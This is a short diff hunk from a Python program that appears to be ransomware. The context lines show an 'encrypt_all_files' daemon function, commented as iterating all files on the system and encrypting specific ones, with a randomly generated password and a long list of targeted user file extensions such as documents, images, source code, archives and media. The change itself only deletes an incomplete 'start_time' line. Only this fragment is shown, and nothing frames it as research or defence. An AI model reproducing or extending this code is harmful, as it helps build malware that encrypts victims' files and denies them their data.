@@ -34,7 +34,6 @@ def encrypt_file(key, filename, filepath):
 
 # this is the run function of the daemon thread, it iterates all the files in system and encryptes specific ones
 def encrypt_all_files():
-    start_time = 
     # encrypt all files with following types
     password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))  # generate random password
     ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
